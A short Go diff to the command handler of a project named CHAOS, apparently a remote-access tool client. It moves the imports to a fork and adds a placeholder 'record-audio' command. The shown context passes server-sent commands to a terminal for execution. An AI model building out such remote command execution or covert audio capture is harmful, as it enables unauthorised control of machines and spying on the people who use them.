@@ -3,15 +3,16 @@ package handler
 import (
 	"encoding/json"
 	"fmt"
-	"github.com/tiagorlampert/CHAOS/client/app/entities"
-	"github.com/tiagorlampert/CHAOS/client/app/gateway"
-	"github.com/tiagorlampert/CHAOS/client/app/services"
-	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
-	"github.com/tiagorlampert/CHAOS/client/app/utilities/encode"
 	"log"
 	"net/http"
 	"strings"
 	"time"
+
+	"github.com/justadoll/CHAOS/client/app/entities"
+	"github.com/justadoll/CHAOS/client/app/gateway"
+	"github.com/justadoll/CHAOS/client/app/services"
+	"github.com/justadoll/CHAOS/client/app/shared/environment"
+	"github.com/justadoll/CHAOS/client/app/utilities/encode"
 )
 
 type Handler struct {
@@ -230,6 +231,8 @@ func (h *Handler) HandleCommand() {
 					break
 				}
 				break
+			case "record-audio":
+				fmt.Println("I should record audio!")
 			default:
 				response = encode.StringToByte(
 					h.Services.Terminal.Run(requestCommand.Request, h.Configuration.Connection.ContextDeadline))
